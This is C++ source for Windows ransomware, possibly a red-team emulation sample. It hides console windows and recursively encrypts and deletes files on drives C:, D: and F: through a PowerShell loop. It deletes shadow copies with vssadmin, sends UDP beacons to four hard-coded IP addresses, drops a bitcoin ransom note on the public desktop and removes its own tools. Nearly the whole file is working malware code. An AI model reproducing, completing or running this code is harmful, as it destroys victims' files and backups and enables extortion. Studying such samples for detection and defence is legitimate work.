#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <windows.h>
#include <wininet.h>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <stdio.h>
#include <io.h>
#include <direct.h>
#include "framework.h"
#include "CB2.1.h"
#include <stdio.h>
#include <string.h>

using namespace std;
namespace fs = std::filesystem;
#pragma comment(lib, "ws2_32.lib")

// A function to create a file with a given name and content
void create_file(string name, string content) {
    ofstream file(name);
    file << content;
    file.close();
}

// A function to run a command and hide the console window
void run_command(string command) {
    WinExec((command).c_str(), SW_HIDE);
}

// A function to encrypt a file using AES-256 and RSA
void encrypt_file(string filename) {
    run_command("C:\\temp\\cb20\\crpt.exe -e " + filename);
}

// A function to encrypt a file using AES-256 and RSA
void encrypt(string folder) {
    run_command("powershell -WindowStyle hidden -command \"cd C:\\ProgramData; (Get-Childitem " + folder + " -Recurse -Attributes !D+!S+!R | where-object {$_.FullName -notmatch 'C:\\\\(\\$Recycle\\.Bin|Config\\.Msi|Program Files\.*|ProgramData|Recovery|Windows|Users\\\\Public)\\\\|\\.sys'} | Select-Object -Property FullName | ForEach-Object {.\\dllhost.exe -e $_.FullName; sleep 0.5; Remove-item $_.FullName})\"");
}

// A function to create UDP traffic on port 6892 to given addresses
void create_traffic(string address) {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(6892);
    dest.sin_addr.s_addr = inet_addr(address.c_str());
    sendto(sock, "Hello", 5, 0, (sockaddr*)&dest, sizeof(dest));
    Sleep(500);
    closesocket(sock);
}

// A function to encrypt all files in a given folder
void encrypt_folder(string folder) {
    for (auto& p : fs::directory_iterator(folder)) {
        if (p.is_regular_file()) {
            if (((_access_s((p.path().string().c_str()), 6)) != -1) && (p.path().string().find("C:\\Windows") == std::string::npos) && (p.path().string().find("C:\\Users\\Public") == std::string::npos) && (p.path().string().find("C:\\Users\\Program Files") == std::string::npos)) {
                encrypt_file('"' + (p.path().string()).c_str() + '"');
                run_command("del /f /q " + '"' + (p.path().string()) + '"');
            }
        }
        else {
            encrypt_folder(p.path().string());
        }
    }
}


int APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow) {
    // Create files with given names and contents under AppData\Local\Temp
    string appdata = std::getenv("APPDATA");
    string temp = appdata + "\\..\\Local\\Temp\\";
    create_file(temp + "floppy_disk.png", "This is a floppy disk image");
    create_file(temp + "floppy_disk_disabled.png", "This is a disabled floppy disk image");
    create_file(temp + "flat.xsl", "This is a spreadsheet file");
    create_file(temp + "Diacid.cpmO", "This is a binary file");
    create_file(temp + "nsmAD93.tmp\\System.dll", "This is a dynamic link library file");
    create_file(temp + "collages.dll", "This is another dynamic link library file");
    // Run adaptertroubleshooter.exe and bthudtask.exe
    run_command("adaptertroubleshooter.exe");
    run_command("bthudtask.exe");
    // Run System.dll file
    run_command(temp + "nsmAD93.tmp\\System.dll");
    //Encrypt
    //string private_msg = "";
    string public_msg = R"(-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwnlsz/1iz78CrVYdEday
El4CNFdpNXHtfFdoWtMcFW+uXYKBLzQ2TqcxEc24uYr+JEPO66C/lWFIme5t/eoZ
YYW3kba2NoOTBSJRBHDF7vt71Nid9Jc4yLmsfE858xSVgWkfqDvEazxZnL68t2rd
/2k4aFKIXFJb0E1jAZunOu/xYW29rjZ2QCfSx3/2vhYQDJHrLcZSW/qCzOpeITlU
6O3v04f6h426K4TQCZwIEroh0P9PWCGGo7NUidd4fmtGtlMZbehMORDvuBW3FY+S
/UQGBV0H47kOL3qANOebST48PGzadgLd29QkSIo+P2BZKBhoBbePvRNombiKBEYL
TQIDAQAB
-----END PUBLIC KEY-----
)";
    create_file("C:\\ProgramData\\public.pem", public_msg);
    //create_file("C:\\temp\\cb20\\private.pem", private_msg);
    encrypt("C:\\");
    encrypt("D:\\");
    encrypt("F:\\");
    // Remove shadow copies
    run_command("vssadmin delete shadows /all /quiet");
    // Create UDP traffic on port 6892 to given addresses
    //vector<string> addresses = { "97.15.12.185", "91.239.24.52", "92.12.15.97", "93.24.239.91" };
    create_traffic("97.15.12.185");
    create_traffic("91.239.24.52");
    create_traffic("92.12.15.97");
    create_traffic("93.24.239.91");
    // Display ransom message through Desktop\_HELP_DECRYPT_N0BR8ST0_.hta file
    string ransom_message = "<html><head><title>Oops, your files have been encrypted!</title></head><body><h1>Oops, your files have been encrypted!</h1><p>Your important files are encrypted using a unique public key generated for this computer. To decrypt the files, you need to obtain the private key.</p><p>The single copy of the private key, which will allow you to decrypt the files, located on a secret server on the Internet; the server will destroy the key after 72 hours.</p><p>To retrieve the private key, you need to pay 1 bitcoin to the following address: 1N0BR8ST0XyzABCdEfGh1234.</p><p>After you've made the payment, send us an email with your transaction ID and your ID key and we will send you the private key.</p><p>Your ID key is: 94D4-ABCD-EFGH-1234</p></body></html>";
    create_file("C:\\Users\\Public\\Desktop\\_HELP_DECRYPT_N0BR8ST0_.hta", ransom_message);
    //_rmdir("C:\\Temp\\cb20");
    run_command("powershell -WindowStyle hidden -command \"sleep 120; Remove-item -Force C:\\ProgramData\\explorer.exe; Remove-item -Force C:\\ProgramData\\public.pem; Remove-item -Force C:\\ProgramData\\dllhost.exe\"");
    return 0;
}